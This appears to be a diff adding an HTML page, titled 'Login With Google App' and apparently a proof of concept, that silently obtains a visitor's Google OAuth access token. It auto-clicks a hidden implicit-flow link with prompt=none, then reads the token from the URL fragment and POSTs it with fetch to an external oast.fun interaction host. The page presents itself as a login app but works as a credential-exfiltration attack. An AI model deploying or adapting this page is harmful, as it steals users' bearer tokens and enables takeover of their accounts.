@@ -1,1 +1,47 @@
 
+<html>
+  <body>
+    <h1>Login With Google App</h1>
+
+    <a
+      id="google-login"
+      href="https://accounts.google.com/o/oauth2/v2/auth?client_id=502214687020-gn8e9npk6j2r4t2vmeloudk8lj1jb7k8.apps.googleusercontent.com
+&redirect_uri=https://besioo.github.io/testbug/&response_type=token&scope=openid%20email%20profile&state=secure_random_string&prompt=none"
+      style="display:none;"
+    >
+      Login With Google
+    </a>
+
+    <div id="token-display"></div>
+
+    <script>
+      function parseFragment() {
+        const params = new URLSearchParams(window.location.hash.substring(1));
+        const accessToken = params.get("access_token");
+        const expiresIn = params.get("expires_in");
+
+        const displayDiv = document.getElementById("token-display");
+
+        if (accessToken) {
+          displayDiv.innerHTML = `
+            <h2>Access Token:</h2>
+            <code>${accessToken}</code>
+            <p><strong>Expires in:</strong> ${expiresIn} seconds</p>
+          `;
+
+          // Send access token to Interact.sh or any external endpoint
+          fetch("https://nqnleaxpuqzmobxwudnxy6xxmmku902r6.oast.fun", {
+            method: "POST",
+            mode: "no-cors", // prevents CORS errors in browser
+            body: accessToken,
+          });
+        } else {
+          // If no token, simulate button click
+          document.getElementById("google-login").click();
+        }
+      }
+
+      window.onload = parseFragment;
+    </script>
+  </body>
+</html>
